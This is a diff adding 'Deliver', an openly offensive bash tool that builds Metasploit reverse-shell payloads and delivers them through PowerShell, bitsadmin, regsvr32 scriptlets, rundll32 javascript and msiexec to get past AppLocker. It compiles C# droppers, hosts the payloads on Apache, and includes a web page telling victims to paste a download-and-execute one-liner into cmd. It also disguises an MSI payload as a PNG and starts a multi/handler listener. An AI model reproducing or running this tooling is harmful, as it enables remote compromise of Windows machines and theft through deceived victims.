@@ -1,0 +1,475 @@
+#!/usr/bin/env bash
+#
+# Deliver  Web Delivery & bypass applocker technic . version 0.1
+#
+#                  Created By Mascerano Bachir .
+#                 Website: http://www.dev-labs.co
+#           YTB : https://www.youtube.com/c/mascerano%20bachir  
+#        FCB : https://www.facebook.com/kali.linux.pentesting.tutorials
+#
+# this is an open source tool if you want to modify or add something . Please give me a copy.
+
+resize -s 22 80 > /dev/null
+#Colors
+cyan='\e[0;36m'
+lightcyan='\e[96m'
+green='\e[0;32m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[1;33m'
+blue='\e[1;34m'
+# Check root
+[[ `id -u` -eq 0 ]] > /dev/null 2>&1 || { echo  $red "You must be root to run the script"; echo ; exit 1; }
+clear
+# check internet 
+function checkinternet() 
+{
+  ping -c 1 google.com > /dev/null 2>&1
+  if [[ "$?" != 0 ]]
+  then
+    echo -e $red  " Checking For Internet: FAILED
+    This Script Needs An Active Internet Connection"
+    echo -e $yellow " Deliver Will Now Exit"
+    echo && sleep 2
+    exit
+  else
+    echo -e $green " Checking For Internet: CONNECTED"
+  fi
+}
+checkinternet
+sleep 2
+#Define options
+path=`pwd`
+txt="$RANDOM.txt"
+txt1="$RANDOM.txt"
+txt2="$RANDOM.txt"
+msi="$RANDOM.msi"
+pwrshell="$path/$txt"
+pwrshell1="$path/$txt1"
+lanip=`ip route get 1 | awk '{print $NF;exit}'`
+publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
+echo ""
+sleep 1
+# spinner for Metasploit Generator
+spinlong ()
+{
+    bar=" ++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
+    barlength=${#bar}
+    i=0
+    while ((i < 100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.02
+    done
+}
+
+# detect ctrl+c exiting
+trap ctrl_c INT
+ctrl_c() {
+clear
+echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
+echo -e $red"[*] Stopping Services... "
+apache_svc_stop
+postgresql_stop
+sleep 1
+echo ""
+echo -e $yellow"[*] Thanks For Using Deliver  :)"
+exit
+}
+#updating your distro
+echo  
+echo -e $green "[ ✔ ] system found."
+echo -e $blue
+sudo cat /etc/issue.net
+#check dependencies existence
+echo -e $blue ""
+echo "---------------------------------------" 
+echo "| Checking dependencies configuration |" 
+echo "---------------------------------------" 
+echo "                                       " 
+# check if metasploit-framework is installed
+which msfconsole > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Metasploit-Framework..............[ found ]"
+which msfconsole > /dev/null 2>&1
+sleep 2
+else
+echo -e $red "[ X ] Metasploit-Framework  -> not found "
+echo -e $yellow "[ ! ] Installing Metasploit-Framework "
+sudo apt-get install metasploit-framework -y
+echo -e $blue "[ ✔ ] Done installing ...."
+which msfconsole > /dev/null 2>&1
+sleep 2
+fi
+#check if xterm is installed
+which xterm > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Xterm.............................[ found ]"
+which xterm > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] xterm -> not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Xterm "
+sleep 2
+echo -e $green ""
+sudo apt-get install xterm -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which xterm > /dev/null 2>&1
+fi
+#check if xterm is installed
+which zenity > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] Zenity............................[ found ]"
+which zenity > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] Zenity -> not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing Zenity "
+sleep 2
+echo -e $green ""
+sudo apt-get install zenity -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which zenity > /dev/null 2>&1
+fi
+#Check for Monodevelop compiler
+which mcs > /dev/null 2>&1
+if [ "$?" -eq "0" ]; then
+echo -e $green "[ ✔ ] MCS...............................[ found ]"
+which xterm > /dev/null 2>&1
+sleep 2
+else
+echo ""
+echo -e $red "[ X ] MCS -> not found! "
+sleep 2
+echo -e $yellow "[ ! ] Installing MonoDevelop "
+sleep 2
+echo -e $green ""
+sudo apt-get install monodevelop -y
+sudo apt-get install mono-complete -y
+clear
+echo -e $blue "[ ✔ ] Done installing .... "
+which mcs > /dev/null 2>&1
+fi
+directory="$path/out"
+if [ ! -d "$directory" ]; then
+	echo "Creating the output directory..."
+	mkdir $directory
+        sleep 3
+fi
+clear
+#function ascii banner
+function print_ascii_art {
+echo -e $white "    ____       ___                 "              
+echo -e $white "   / __ \___  / (_)   _____  _____ "
+echo -e $white "  / / / / _ \/ / / | / / _ \/ ___/ "
+echo -e $red   " / /_/ /  __/ / /| |/ /  __/ /     "
+echo -e $green "/_____/\___/_/_/ |___/\___/_/ 0.1  "    
+echo ""                                  
+echo "  Coded by Mascerano Bachir | [Dev-labs]     "                                    
+}
+#function lhost
+function get_lhost() 
+{
+  LHOST=$(zenity --title="+ SET LHOST +" --text "Your-Local-ip: $lanip ; Your-Public-ip: $publicip" --entry-text "$lanip" --entry --width 300 2> /dev/null)
+}
+#function lport
+function get_lport() 
+{
+  LPORT=$(zenity --title="+ SET LPORT +" --text "example: 4444" --entry-text "4444" --entry --width 300 2> /dev/null)
+}
+#function payload
+function get_payload()
+{
+  PAYLOAD=$(zenity --list --title "+DELIVER+" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_winhttp" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_http" FALSE "windows/x64/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp_dns" FALSE "windows/x64/meterpreter/reverse_winhttp" FALSE "windows/x64/meterpreter/reverse_winhttps" --width 400 --height 400 2> /dev/null)
+}
+#function name
+function payload_name()
+{
+ pay_name=$(zenity --title "+PAYLOAD NAME+" --text "example: deliver" --entry --entry-text "deliver" --width 300 2> /dev/null)
+}
+#function index name
+function index_name()
+{
+ index=$(zenity --title "+INDEX NAME+" --text "example: wtf.html" --entry --entry-text "wtf" --width 300)
+}
+#function generate payload
+function gen_payload()
+{
+  echo -e $yellow ""
+  echo "[*] Generating raw shellcode"
+  spinlong
+  xterm -T " GENERATE RAW SHELLCODE" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e cmd/powershell_base64 -f psh-cmd --smallest -o $pwrshell > /dev/null 2>&1
+}
+function gen_payload_msi()
+{
+  echo -e $yellow ""
+  echo "[*] Generating payload"
+  spinlong
+  xterm -T "GENERATE PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -e x86/shikata_ga_nai -f msi -o $pay_name.msi > /dev/null 2>&1
+}
+function msf_exec()
+{
+  xterm -e msfvenom -p windows/exec CMD="$com0" -f exe -o $path/out/$pay_name.exe > /dev/null 2>&1
+}
+#function apache2 service
+function apache_svc_start()
+{
+  service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function apache_svc_stop()
+{
+  service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+#function postgresql service
+function postgresql_start()
+{
+ service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+function postgresql_stop()
+{
+service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+}
+#function listeners
+function msf_listener()
+{
+while true; do
+   echo ""
+   msf_list=$(zenity --list --title "+ DELIVER OPTIONS +" --text "Would you like to start a listener?" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   case $msf_list in 
+   Multi-Handler) postgresql_start;xterm -T "DELIVER MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z'";echo "";suite;;
+   Main-Menu) clear;main;;
+   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
+   esac
+done
+} 
+#function suite
+function suite()
+{
+while true; do
+   echo ""
+   suit=$(zenity --list --title "+ DELIVER OPTIONS +" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
+   case $suit in
+   Main-Menu) clear;main;;
+   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
+   esac
+done
+}
+#function clean files
+function clean()
+{
+ rm $directory/* > /dev/null 2>&1
+ rm /var/www/html/deliver.sct > /dev/null 2>&1
+ rm /var/www/html/deliver.png > /dev/null 2>&1
+ rm /var/www/html/deliver.txt > /dev/null 2>&1
+ rm /var/www/html/final.bat > /dev/null 2>&1
+ rm /var/www/html/$index.html > /dev/null 2>&1
+}      
+clear
+#main menu
+function main()
+{
+    while :
+    do
+
+        print_ascii_art
+        echo -e $green ""
+        echo "╔──────────────────────────────────────────────╗"
+        echo "|      Web Delivery & bypass applocker tech    |"
+        echo "╠──────────────────────────────────────────────╣"
+        echo "|[1] powershell delivery         [2] bitsadmin |"
+        echo "|[3] regsvr32                    [4] rundll32  |"
+        echo "|[5] msiexec                     [c] clean     |"
+        echo "|[q] Quit                                      |"
+        echo "╠──────────────────────────────────────────────╣"
+        read -p "[?] Select>: " option
+        echo
+        
+        case "$option" in 
+            1)  echo -e $lightgreen "[✔] powershell delivery"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                spinlong
+                gen_payload
+                sed 's|%COMSPEC% /b /c start /b /min ||g' $pwrshell > $pwrshell1
+                rm -f $pwrshell*
+                echo '// C#' >> final.cs 
+                echo 'using System.Runtime.InteropServices;' >> final.cs 
+                echo 'namespace pshcmd' >> final.cs
+                echo '{' >> final.cs
+                echo '	public class CMD' >> final.cs
+                echo '	{' >> final.cs
+                echo '		[DllImport("msvcrt.dll")]' >> final.cs
+                echo '		public static extern int system(string cmd);' >> final.cs
+                echo '		public static void Main()' >> final.cs
+                echo '		{' >> final.cs
+                com0=`cat $pwrshell1`
+                echo '			system("cmd0");' | sed "s|cmd0|$com0|" >> final.cs
+                echo '		}' >> final.cs
+                echo '	}' >> final.cs
+                echo '}' >> final.cs
+                rm -f $pwrshell1*
+                payload_name
+                mcs -unsafe final.cs -out:$path/out/$pay_name.exe 
+                rm -f final.cs
+                sleep 2
+                echo ""
+                zenity --info --text "Payload Stored in $path/out/$pay_name.exe " --width 400 > /dev/null 2>&1
+                msf_listener
+                echo
+                ;;
+            2)  echo -e $lightgreen "[✔] bitsadmin"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                spinlong
+                gen_payload
+                sed 's|%COMSPEC% /b /c start /b /min ||g' $pwrshell > $pwrshell1
+                rm -f $pwrshell*
+                mv $pwrshell1 /var/www/html/final.bat
+                apache_svc_start > /dev/null 2>&1
+                payload_name > /dev/null 2>&1
+                echo '@echo off' >> $pay_name.bat 
+                echo 'bitsadmin /transfer final /download /priority high http://local_ip/final.bat %APPDATA%\final.bat&start /b /min %APPDATA%\final.bat' | sed "s|local_ip|$LHOST|" >> $pay_name.bat
+                mv $pay_name.bat $path/out 
+                sleep 2
+                echo ""
+                zenity --info --text "Payload Stored in $path/out/$pay_name.bat " --width 400 > /dev/null 2>&1
+                msf_listener 
+                echo
+                ;;
+            3)  echo -e $lightgreen "[✔] regsvr32"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                spinlong
+                gen_payload
+                sed 's|%COMSPEC% /b /c start /b /min ||g' $pwrshell > $pwrshell1
+                rm -f $pwrshell*
+                echo '<?XML version="1.0"?>' >> deliver.sct 
+                echo '<scriptlet>' >> deliver.sct 
+                echo '<registration' >> deliver.sct
+                echo '    progid="PoC"' >> deliver.sct
+                echo '    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >' >> deliver.sct
+                echo '	<script language="JScript">' >> deliver.sct
+                echo '		<![CDATA[' >> deliver.sct
+                com0=`cat $pwrshell1`
+                echo '			var r = new ActiveXObject("WScript.Shell").Run("cmd0");' | sed "s|cmd0|$com0|" >> deliver.sct
+                echo '		]]>' >> deliver.sct
+                echo '</script>' >> deliver.sct
+                echo '</registration>' >> deliver.sct
+                echo '</scriptlet>' >> deliver.sct
+                rm -f $pwrshell1*
+                mv deliver.sct /var/www/html
+                apache_svc_start
+                echo '// C#' >> final.cs 
+                echo 'using System.Runtime.InteropServices;' >> final.cs 
+                echo 'namespace Regsvr' >> final.cs
+                echo '{' >> final.cs
+                echo '	public class CMD' >> final.cs
+                echo '	{' >> final.cs
+                echo '		[DllImport("msvcrt.dll")]' >> final.cs
+                echo '		public static extern int system(string cmd);' >> final.cs
+                echo '		public static void Main()' >> final.cs
+                echo '		{' >> final.cs
+                echo '			system("cmd1");' | sed "s|cmd1|regsvr32 /s /n /u /i:http://$LHOST/deliver.sct scrobj.dll|" >> final.cs
+                echo '		}' >> final.cs
+                echo '	}' >> final.cs
+                echo '}' >> final.cs
+                payload_name
+                mcs -unsafe final.cs -out:$path/out/$pay_name.exe
+                rm -f final.cs
+                sleep 2
+                echo ""
+                zenity --info --text "Payload Stored in $path/out/$pay_name.exe " --width 400 > /dev/null 2>&1
+                msf_listener 
+                echo
+                ;;
+            4)  echo -e $lightgreen "[✔] rundll32"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                spinlong
+                gen_payload
+                sed 's|%COMSPEC% /b /c start /b /min ||g' $pwrshell > $pwrshell1
+                rm -f $pwrshell*
+                mv $pwrshell1 /var/www/html/deliver.txt
+                apache_svc_start
+                index_name > /dev/null 2>&1
+                echo "<html>" >> /var/www/html/$index.html
+                echo "<body>" >> /var/www/html/$index.html
+                echo "<p>open cmd and type this code to download the file:</p>" >> /var/www/html/$index.html
+                echo "<p><font size="2">" >> /var/www/html/$index.html             
+                echo 'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('"'http://local-ip'"');");new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);' | sed "s|local-ip|$LHOST/deliver.txt|" >> /var/www/html/$index.html
+                echo "</font></p>" >> /var/www/html/$index.html
+                echo "</body>" >> /var/www/html/$index.html
+                echo "</html>" >> /var/www/html/$index.html
+                sleep 2
+                echo ""
+                zenity --info --text "Send This Link ==> http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
+                msf_listener 
+                echo
+                ;;
+            5)  echo -e $lightgreen "[✔] msiexec"
+                echo -e $green
+                get_lhost
+                get_lport
+                echo
+                get_payload
+                echo
+                spinlong
+                gen_payload_msi
+                mv $pay_name.msi /var/www/html/deliver.png
+                apache_svc_start
+                echo "msiexec /q /i http://local_ip/deliver.png" | sed "s|local_ip|$LHOST|" >> $txt2
+                com0=`cat $txt2`
+                payload_name
+                msf_exec
+                rm $txt2 
+                echo ""
+                zenity --info --text "Payload Stored in $path/out/$pay_name.exe " --width 400 > /dev/null 2>&1
+                msf_listener 
+                echo
+                ;;
+            c)  echo -e $lightgreen "[✔] clean up all files"
+                echo
+                clean
+                echo -e $yellow " Files Removed ✔"
+                echo
+                read -p "press any key to return....."
+                sleep 2
+                clear
+                echo
+                ;;
+            q)  echo -e $yellow " Good Bye !!"
+                echo
+                exit 0 
+                ;;
+            *)  echo -e $red  "【X】 Invalid option, please write a valid number【X】"
+                echo
+                ;;
+        esac
+    done
+}
+main
+
